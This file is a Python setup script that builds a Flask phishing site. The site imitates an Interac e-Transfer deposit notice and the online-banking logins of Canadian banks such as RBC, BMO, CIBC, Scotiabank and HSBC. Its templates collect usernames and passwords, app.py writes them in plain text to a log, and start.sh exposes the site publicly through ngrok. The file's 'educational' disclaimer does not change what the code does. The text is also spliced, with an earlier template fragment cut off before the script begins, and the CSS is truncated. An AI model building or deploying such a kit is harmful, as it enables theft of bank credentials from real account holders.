def create_page_templates():
    """Create page1.html through page11.html - all with same bank selection grid"""
    
    content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - Deposit Your Money</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header class="header">
        <a href="{{ url_for('index') }}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <main class="main-container">
        <div class="deposit-header">
            <div class="deposit-info">
                <h1>Deposit Your Money</h1>
                <div class="amount">$128.67<span class="currency">CAD</span></div>
                <div class="from-info">From : MARC-ETIENNE M.LEVEILLE</div>
            </div>
            <div class="expires-info">
                <div><strong>Expires:</strong></div>
                <div>June 1, 2018</div>
                <div><strong>Reference #:</strong></div>
            </div>
        </div>

        <section>
            <h2 class="section-title">Select Your Financial Institution</h2>

            <div class="search-container">
                <div class="search-box">
                    <input type="text" placeholder="Search">
                    <div class="search-icon">🔍</div>
                </div>
            </div>

            <div class="banks-grid">
                <button class="bank-option" onclick="showBankLogin('ATB', 'https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="ATB" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('BMO', 'https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png')">
                    <img src="https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png" alt="BMO" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('CIBC', 'https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png')">
                    <img src="https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png" alt="CIBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Desjardins', 'https://i.ibb.co/gFbHC77K/Desjardins-Group-logo-svg.png')">
                    <img src="https://i.ibb.co/gFbHC77K/Desjardins-Group-logo-svg.png" alt="Desjardins" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('HSBC', 'https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png')">
                    <img src="https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png" alt="HSBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Laurentian', 'https://i.ibb.co/hJhqY3pq/Laurentian-Bank-logo-fr.png')">
                    <img src="https://i.ibb.co/hJhqY3pq/Laurentian-Bank-logo-fr.png" alt="Laurentian Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Manulife', 'https://i.ibb.co/B24xrR4b/Manulife-logo-svg.png')">
                    <img src="https://i.ibb.co/B24xrR4b/Manulife-logo-svg.png" alt="Manulife Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Meridian', 'https://i.ibb.co/PZzGx3st/Meridian-2019.webp')">
                    <img src="https://i.ibb.co/PZzGx3st/Meridian-2019.webp" alt="Meridian" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('National Bank', 'https://i.ibb.co/3mp962GJ/images.png')">
                    <img src="https://i.ibb.co/3mp962GJ/images.png" alt="National Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('RBC', 'https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png')">
                    <img src="https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png" alt="RBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Scotiabank', 'https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png')">
                    <img src="https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png" alt="Scotiabank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="showBankLogin('Simplii', 'https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="Simplii" class="bank-logo">
                </button>
            </div>

            <div class="or-divider">
                <span>OR</span>
            </div>

            <div class="dropdown-section">
                <div class="dropdown-group">
                    <label for="financial-institution">Select Your Financial Institution</label>
                    <select id="financial-institution">
                        <option value="">Choose your bank...</option>
                        <option value="atb">ATB Financial</option>
                        <option value="bmo">BMO</option>
                        <option value="cibc">CIBC</option>
                        <option value="desjardins">Desjardins</option>
                    </select>
                </div>
                <div class="dropdown-group">
                    <label for="province">Select Province or Territory</label>
                    <select id="province">
                        <option value="">Choose province...</option>
                        <option value="ab">Alberta</option>
                        <option value="bc">British Columbia</option>
                        <option value="mb">Manitoba</option>#!/usr/bin/env python3
"""
Flask Interac App - Project Setup Script
This script creates all necessary files and folders for the project.
"""

import os

def create_directory_structure():
    """Create the project directory structure"""
    dirs = ['templates', 'static']
    for d in dirs:
        os.makedirs(d, exist_ok=True)
    print("✅ Created directory structure")

def create_app_py():
    """Create app.py"""
    content = '''from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import os

app = Flask(__name__)

# Ensure log file exists
LOG_FILE = 'submissions.log'

def log_submission(page, username, password):
    """Log submission to terminal and file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] Page: {page} | Username: {username} | Password: {password}\\n"
    
    # Print to terminal
    print(log_entry.strip())
    
    # Append to log file
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

@app.route('/')
def index():
    """Main index page with links to all pages"""
    return render_template('index.html')

@app.route('/page<int:page_num>', methods=['GET', 'POST'])
def page(page_num):
    """Handle pages 1-11 with login forms"""
    if page_num < 1 or page_num > 11:
        return "Page not found", 404
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        bank = request.form.get('bank', 'Unknown')
        log_entry = f'page{page_num} - {bank}'
        log_submission(log_entry, username, password)
        return redirect(url_for('page', page_num=page_num))
    
    return render_template(f'page{page_num}.html', page_num=page_num)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)'''
    
    with open('app.py', 'w') as f:
        f.write(content)
    print("✅ Created app.py")

def create_requirements():
    """Create requirements.txt"""
    content = '''Flask==3.0.0
pyngrok==7.0.1
Werkzeug==3.0.1'''
    
    with open('requirements.txt', 'w') as f:
        f.write(content)
    print("✅ Created requirements.txt")

def create_start_sh():
    """Create start.sh"""
    content = '''#!/bin/bash

echo "Starting Flask Multi-Page Application..."
echo "========================================"

# Start ngrok in the background
echo "Starting ngrok on port 5000..."
pyngrok http 5000 > /dev/null 2>&1 &
NGROK_PID=$!

# Wait for ngrok to initialize
sleep 2

# Get the ngrok public URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"https://[^"]*' | head -1 | cut -d'"' -f4)

if [ -z "$NGROK_URL" ]; then
    echo "Warning: Could not retrieve ngrok URL"
    echo "You can check manually at: http://localhost:4040"
else
    echo ""
    echo "╔════════════════════════════════════════════════════════╗"
    echo "║  🌐 ngrok Public URL:                                 ║"
    echo "║  $NGROK_URL"
    echo "╚════════════════════════════════════════════════════════╝"
    echo ""
fi

echo "Local URL: http://localhost:5000"
echo "ngrok Inspector: http://localhost:4040"
echo "========================================"
echo ""

# Start Flask app
python app.py

# Cleanup ngrok on exit
kill $NGROK_PID 2>/dev/null'''
    
    with open('start.sh', 'w') as f:
        f.write(content)
    os.chmod('start.sh', 0o755)
    print("✅ Created start.sh (made executable)")

def create_gitignore():
    """Create .gitignore"""
    content = '''# Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
venv/
ENV/
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
wheels/
*.egg-info/
.installed.cfg
*.egg

# Flask
instance/
.webassets-cache

# Logs
*.log
submissions.log

# Environment variables
.env
.flaskenv

# IDE
.vscode/
.idea/
*.swp
*.swo
*~

# OS
.DS_Store
Thumbs.db

# ngrok
ngrok.yml'''
    
    with open('.gitignore', 'w') as f:
        f.write(content)
    print("✅ Created .gitignore")

def create_readme():
    """Create README.md"""
    content = '''# Flask Multi-Page Login Application

A simple Flask web application with 12 pages featuring login forms and submission logging.

## Features

- 🏠 Main index page with navigation to 11 sub-pages
- 🔐 Login forms on pages 1-11
- 📝 Logs all submissions to terminal and `submissions.log`
- 🌐 ngrok integration for public URL access
- 🎨 Clean, responsive Interac e-Transfer themed design

## Installation

1. Create a virtual environment (recommended):
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\\Scripts\\activate
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

## Usage

### Quick Start with ngrok

Run the application with ngrok (provides public URL):

```bash
chmod +x start.sh
./start.sh
```

### Manual Start (Local Only)

To run without ngrok:

```bash
python app.py
```

Visit `http://localhost:5000` in your browser.

## Security Notes

⚠️ **Warning**: This application is for educational/demonstration purposes only. It:
- Logs passwords in plain text
- Does not implement proper authentication
- Should NOT be used in production environments

## License

MIT License - feel free to use and modify as needed.'''
    
    with open('README.md', 'w') as f:
        f.write(content)
    print("✅ Created README.md")

def create_index_html():
    """Create templates/index.html"""
    content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - Select Page</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header class="header">
        <a href="{{ url_for('index') }}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <main class="main-container">
        <div class="deposit-header">
            <div class="deposit-info">
                <h1>Select Your Transfer Page</h1>
                <div class="from-info">Choose a page to deposit your funds</div>
            </div>
        </div>

        <section>
            <h2 class="section-title">Available Transfer Pages</h2>
            
            <div class="banks-grid">
                {% for i in range(1, 12) %}
                <a href="{{ url_for('page', page_num=i) }}" class="bank-option">
                    <div style="font-size: 24px; font-weight: bold; color: #005daa;">Page {{ i }}</div>
                </a>
                {% endfor %}
            </div>
        </section>
    </main>
</body>
</html>'''
    
    with open('templates/index.html', 'w') as f:
        f.write(content)
    print("✅ Created templates/index.html")

def create_bank_page(page_num, bank_name, logo_url):
    """Create a specific bank page with login form"""
    content = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - {bank_name} Login</title>
    <link rel="stylesheet" href="{{{{ url_for('static', filename='style.css') }}}}">
    <style>
        .bank-login-container {{
            max-width: 500px;
            margin: 50px auto;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 40px;
        }}
        .bank-logo-large {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .bank-logo-large img {{
            max-width: 200px;
            height: auto;
        }}
        .login-form {{
            margin-top: 30px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            font-size: 16px;
        }}
        .form-group input:focus {{
            outline: none;
            border-color: #005daa;
        }}
        .btn-login {{
            width: 100%;
            padding: 14px;
            background: #005daa;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }}
        .btn-login:hover {{
            background: #004a8a;
        }}
        .back-link {{
            text-align: center;
            margin-top: 20px;
        }}
        .back-link a {{
            color: #005daa;
            text-decoration: none;
        }}
        .back-link a:hover {{
            text-decoration: underline;
        }}
        .transfer-info {{
            background-color: #f0f4ff;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 30px;
            border-left: 4px solid #005daa;
        }}
        .transfer-info h3 {{
            margin-bottom: 10px;
            color: #333;
        }}
        .transfer-amount {{
            font-size: 28px;
            font-weight: bold;
            color: #005daa;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <header class="header">
        <a href="{{{{ url_for('index') }}}}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <div class="bank-login-container">
        <div class="transfer-info">
            <h3>Interac e-Transfer</h3>
            <div class="transfer-amount">$128.67 CAD</div>
            <p style="color: #666; margin: 5px 0;">From: MARC-ETIENNE M.LEVEILLE</p>
            <p style="color: #666; font-size: 14px;">Expires: June 1, 2018</p>
        </div>

        <div class="bank-logo-large">
            <img src="{logo_url}" alt="{bank_name}">
        </div>

        <h2 style="text-align: center; color: #333; margin-bottom: 10px;">{bank_name} Online Banking</h2>
        <p style="text-align: center; color: #666; margin-bottom: 20px;">Log in to deposit your money</p>

        <form method="POST" class="login-form">
            <div class="form-group">
                <label for="username">Username / Card Number</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <input type="hidden" name="bank" value="{bank_name}">
            
            <button type="submit" class="btn-login">Continue</button>
        </form>

        <div class="back-link">
            <a href="{{{{ url_for('index') }}}}">← Back to bank selection</a>
        </div>
    </div>
</body>
</html>'''
    
    with open(f'templates/page{page_num}.html', 'w') as f:
        f.write(content)

def create_page_templates():
    """Create page1.html through page11.html"""
    
    # Create dedicated bank pages
    banks = [
        (1, "ATB Financial", "https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png"),
        (2, "BMO", "https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png"),
        (3, "CIBC", "https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png"),
        (5, "HSBC", "https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png"),
        (10, "RBC", "https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png"),
        (11, "Scotiabank", "https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png"),
    ]
    
    for page_num, bank_name, logo_url in banks:
        create_bank_page(page_num, bank_name, logo_url)
    
    # Create modal pages (4, 6, 7, 8, 9)
    modal_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - Deposit Your Money</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header class="header">
        <a href="{{ url_for('index') }}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <main class="main-container">
        <div class="deposit-header">
            <div class="deposit-info">
                <h1>Deposit Your Money</h1>
                <div class="amount">$128.67<span class="currency">CAD</span></div>
                <div class="from-info">From : MARC-ETIENNE M.LEVEILLE</div>
            </div>
            <div class="expires-info">
                <div><strong>Expires:</strong></div>
                <div>June 1, 2018</div>
                <div><strong>Reference #:</strong></div>
            </div>
        </div>

        <section>
            <h2 class="section-title">Select Your Financial Institution</h2>

            <div class="search-container">
                <div class="search-box">
                    <input type="text" placeholder="Search">
                    <div class="search-icon">🔍</div>
                </div>
            </div>

            <div class="banks-grid">
                <button class="bank-option" onclick="redirectToBank('ATB')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="ATB" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('BMO')">
                    <img src="https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png" alt="BMO" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('CIBC')">
                    <img src="https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png" alt="CIBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Desjardins')">
                    <img src="https://i.ibb.co/gFbHC77K/Desjardins-Group-logo-svg.png" alt="Desjardins" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('HSBC')">
                    <img src="https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png" alt="HSBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Laurentian')">
                    <img src="https://i.ibb.co/hJhqY3pq/Laurentian-Bank-logo-fr.png" alt="Laurentian Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Manulife')">
                    <img src="https://i.ibb.co/B24xrR4b/Manulife-logo-svg.png" alt="Manulife Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Meridian')">
                    <img src="https://i.ibb.co/PZzGx3st/Meridian-2019.webp" alt="Meridian" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('National Bank')">
                    <img src="https://i.ibb.co/3mp962GJ/images.png" alt="National Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('RBC')">
                    <img src="https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png" alt="RBC" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Scotiabank')">
                    <img src="https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png" alt="Scotiabank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Simplii')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="Simplii" class="bank-logo">
                </button>
            </div>

            <div class="or-divider">
                <span>OR</span>
            </div>

            <div class="dropdown-section">
                <div class="dropdown-group">
                    <label for="financial-institution">Select Your Financial Institution</label>
                    <select id="financial-institution">
                        <option value="">Choose your bank...</option>
                        <option value="atb">ATB Financial</option>
                        <option value="bmo">BMO</option>
                        <option value="cibc">CIBC</option>
                        <option value="desjardins">Desjardins</option>
                    </select>
                </div>
                <div class="dropdown-group">
                    <label for="province">Select Province or Territory</label>
                    <select id="province">
                        <option value="">Choose province...</option>
                        <option value="ab">Alberta</option>
                        <option value="bc">British Columbia</option>
                        <option value="mb">Manitoba</option>
                        <option value="nb">New Brunswick</option>
                        <option value="nl">Newfoundland and Labrador</option>
                        <option value="ns">Nova Scotia</option>
                        <option value="on">Ontario</option>
                        <option value="pe">Prince Edward Island</option>
                        <option value="qc">Quebec</option>
                        <option value="sk">Saskatchewan</option>
                    </select>
                </div>
            </div>
        </section>
    </main>

    <script>
        function redirectToBank(bankName) {
            showLoginModal(bankName);
        }

        function showLoginModal(bankName) {
            const modal = document.createElement('div');
            modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:1000;';
            
            modal.innerHTML = `
                <div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:90%;">
                    <h2 style="margin-bottom:20px;color:#333;">${bankName} Login</h2>
                    <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
                        <div style="margin-bottom:15px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Username</label>
                            <input type="text" name="username" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <div style="margin-bottom:20px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Password</label>
                            <input type="password" name="password" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <input type="hidden" name="bank" value="${bankName}">
                        <div style="display:flex;gap:10px;">
                            <button type="submit" style="flex:1;padding:12px;background:#005daa;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
                            <button type="button" onclick="this.closest('div').parentElement.parentElement.remove()" style="flex:1;padding:12px;background:#ccc;color:#333;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Cancel</button>
                        </div>
                    </form>
                </div>
            `;
            
            document.body.appendChild(modal);
        }
    </script>
</body>
</html>'''
    
    modal_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - Deposit Your Money</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header class="header">
        <a href="{{ url_for('index') }}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <main class="main-container">
        <div class="deposit-header">
            <div class="deposit-info">
                <h1>Deposit Your Money</h1>
                <div class="amount">$128.67<span class="currency">CAD</span></div>
                <div class="from-info">From : MARC-ETIENNE M.LEVEILLE</div>
            </div>
            <div class="expires-info">
                <div><strong>Expires:</strong></div>
                <div>June 1, 2018</div>
                <div><strong>Reference #:</strong></div>
            </div>
        </div>

        <section>
            <h2 class="section-title">Select Your Financial Institution</h2>

            <div class="search-container">
                <div class="search-box">
                    <input type="text" placeholder="Search">
                    <div class="search-icon">🔍</div>
                </div>
            </div>

            <div class="banks-grid">
                <a href="{{ url_for('page', page_num=1) }}" class="bank-option">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="ATB" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=2) }}" class="bank-option">
                    <img src="https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png" alt="BMO" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=3) }}" class="bank-option">
                    <img src="https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png" alt="CIBC" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Desjardins')">
                    <img src="https://i.ibb.co/gFbHC77K/Desjardins-Group-logo-svg.png" alt="Desjardins" class="bank-logo">
                </button>
                <a href="{{ url_for('page', page_num=5) }}" class="bank-option">
                    <img src="https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png" alt="HSBC" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Laurentian')">
                    <img src="https://i.ibb.co/hJhqY3pq/Laurentian-Bank-logo-fr.png" alt="Laurentian Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Manulife')">
                    <img src="https://i.ibb.co/B24xrR4b/Manulife-logo-svg.png" alt="Manulife Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Meridian')">
                    <img src="https://i.ibb.co/PZzGx3st/Meridian-2019.webp" alt="Meridian" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('National Bank')">
                    <img src="https://i.ibb.co/3mp962GJ/images.png" alt="National Bank" class="bank-logo">
                </button>
                <a href="{{ url_for('page', page_num=10) }}" class="bank-option">
                    <img src="https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png" alt="RBC" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=11) }}" class="bank-option">
                    <img src="https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png" alt="Scotiabank" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Simplii')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="Simplii" class="bank-logo">
                </button>
            </div>

            <div class="or-divider">
                <span>OR</span>
            </div>

            <div class="dropdown-section">
                <div class="dropdown-group">
                    <label for="financial-institution">Select Your Financial Institution</label>
                    <select id="financial-institution">
                        <option value="">Choose your bank...</option>
                        <option value="atb">ATB Financial</option>
                        <option value="bmo">BMO</option>
                        <option value="cibc">CIBC</option>
                        <option value="desjardins">Desjardins</option>
                    </select>
                </div>
                <div class="dropdown-group">
                    <label for="province">Select Province or Territory</label>
                    <select id="province">
                        <option value="">Choose province...</option>
                        <option value="ab">Alberta</option>
                        <option value="bc">British Columbia</option>
                        <option value="mb">Manitoba</option>
                        <option value="nb">New Brunswick</option>
                        <option value="nl">Newfoundland and Labrador</option>
                        <option value="ns">Nova Scotia</option>
                        <option value="on">Ontario</option>
                        <option value="pe">Prince Edward Island</option>
                        <option value="qc">Quebec</option>
                        <option value="sk">Saskatchewan</option>
                    </select>
                </div>
            </div>
        </section>
    </main>

    <script>
        function redirectToBank(bankName) {
            showLoginModal(bankName);
        }

        function showLoginModal(bankName) {
            const modal = document.createElement('div');
            modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:1000;';
            
            modal.innerHTML = `
                <div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:90%;">
                    <h2 style="margin-bottom:20px;color:#333;">${bankName} Login</h2>
                    <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
                        <div style="margin-bottom:15px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Username</label>
                            <input type="text" name="username" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <div style="margin-bottom:20px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Password</label>
                            <input type="password" name="password" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <input type="hidden" name="bank" value="${bankName}">
                        <div style="display:flex;gap:10px;">
                            <button type="submit" style="flex:1;padding:12px;background:#005daa;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
                            <button type="button" onclick="this.closest('div').parentElement.parentElement.remove()" style="flex:1;padding:12px;background:#ccc;color:#333;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Cancel</button>
                        </div>
                    </form>
                </div>
            `;
            
            document.body.appendChild(modal);
        }
    </script>
</body>
</html>'''
    
    # Pages 4, 6, 7, 8, 9 use the modal
    modal_pages = [4, 6, 7, 8, 9]
    for page_num in modal_pages:
        with open(f'templates/page{page_num}.html', 'w') as f:
            f.write(modal_content)
    
    print("✅ Created templates/page1.html through page11.html")

def create_css():
    """Create static/style.css"""
    content = '''* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
}

.header {
    background-color: #4a4a4a;
    color: white;
    padding: 12px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.logo {
    display: flex;
    align-items: center;
    text-decoration: none;
}

.logo-img {
    height: 50px;
    width: auto;
}

.nav-menu {
    display: flex;
    gap: 20px;
    align-items: center;
}

.nav-menu a {
    color: white;
    text-decoration: none;
    font-size: 14px;
}

.nav-menu a:hover {
    text-decoration: underline;
}

.help-icon {
    background-color: #666;
    color: white;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
}

.main-container {
    max-width: 800px;
    margin: 20px auto;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    padding: 30px;
}

.deposit-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 30px;
    border-bottom: 2px solid #e0e0e0;
    padding-bottom: 20px;
}

.deposit-info h1 {
    color: #333;
    font-size: 28px;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
}

.deposit-info h1::before {
    content: "↓";
    margin-right: 10px;
    color: #666;
}

.amount {
    font-size: 36px;
    font-weight: bold;
    color: #333;
    margin-bottom: 8px;
}

.currency {
    font-size: 18px;
    color: #666;
    margin-left: 5px;
}

.from-info {
    color: #666;
    font-size: 14px;
}

.expires-info {
    text-align: right;
    color: #666;
    font-size: 14px;
}

.expires-info div {
    margin-bottom: 5px;
}

.section-title {
    font-size: 20px;
    font-weight: bold;
    color: #333;
    margin-bottom: 20px;
}

.search-container {
    display: flex;
    justify-content: flex-end;
    margin-bottom: 20px;
}

.search-box {
    display: flex;
    align-items: center;
    background-color: #f0f0f0;
    border-radius: 20px;
    padding: 8px 15px;
}

.search-box input {
    border: none;
    background: transparent;
    outline: none;
    margin-right: 10px;
    font-size: 14px;
}

.search-icon {
    background-color: #ff9900;
    color: white;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
}

.banks-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 15px;
    margin-bottom: 30px;
}

.bank-option {
    background-color: white;
    border: 2px solid #e0e0e0;
    border-radius: 8px;
    padding: 20px;
    text-align: center;
    cursor: pointer;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 80px;
    text-decoration: none;
}

.bank-option:hover {
    border-color: #0066cc;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.bank-logo {
    max-width: 100%;
    height: 40px;
    object-fit: contain;
}

.or-divider {
    text-align: center;
    margin: 30px 0;
    position: relative;
}

.or-divider::before {
    content: "";
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    height: 1px;
    background-color: #ccc;
}

.or-divider span {
    background-color: white;
    padding: 0 20px;
    color: #666;
    font-weight: bold;
    position: relative;
}

.dropdown-section {
    display: flex;
    gap: 20px;
